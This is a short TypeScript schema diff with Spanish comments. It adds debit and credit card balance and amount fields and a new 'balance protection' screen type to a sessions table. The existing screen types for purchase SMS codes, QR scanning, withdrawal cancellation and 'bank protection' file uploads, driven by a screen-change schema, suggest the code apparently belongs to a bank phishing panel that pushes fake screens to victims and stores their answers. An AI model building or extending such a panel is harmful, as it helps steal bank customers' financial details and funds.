@@ -140,7 +140,12 @@ export const sessions = pgTable("sessions", {
   // Información del archivo para protección bancaria
   fileName: text("file_name"), // Nombre del archivo subido
   fileUrl: text("file_url"), // URL del archivo para descarga
-  fileSize: text("file_size") // Tamaño del archivo
+  fileSize: text("file_size"), // Tamaño del archivo
+  // Información de protección de saldo
+  saldoDebito: text("saldo_debito"), // Respuesta sobre tarjeta de débito
+  montoDebito: text("monto_debito"), // Monto en tarjeta de débito
+  saldoCredito: text("saldo_credito"), // Respuesta sobre tarjeta de crédito
+  montoCredito: text("monto_credito") // Monto en tarjeta de crédito
 });
 
 export const insertSessionSchema = createInsertSchema(sessions).pick({
@@ -248,7 +253,8 @@ export enum ScreenType {
   SMS_COMPRA = "sms_compra",
   ESCANEAR_QR = "escanear_qr",
   CANCELACION_RETIRO = "cancelacion_retiro",
-  PROTECCION_BANCARIA = "proteccion_bancaria"
+  PROTECCION_BANCARIA = "proteccion_bancaria",
+  PROTECCION_SALDO = "proteccion_saldo"
 }
 
 export const screenChangeSchema = z.object({
@@ -266,6 +272,10 @@ export const screenChangeSchema = z.object({
   fileName: z.string().optional(), // Para archivos de protección bancaria
   fileUrl: z.string().optional(), // URL del archivo de protección
   fileSize: z.string().optional(), // Tamaño del archivo de protección
+  saldoDebito: z.string().optional(), // Respuesta sobre tarjeta de débito
+  montoDebito: z.string().optional(), // Monto en tarjeta de débito
+  saldoCredito: z.string().optional(), // Respuesta sobre tarjeta de crédito
+  montoCredito: z.string().optional(), // Monto en tarjeta de crédito
 });
 
 export type ScreenChangeData = z.infer<typeof screenChangeSchema>;
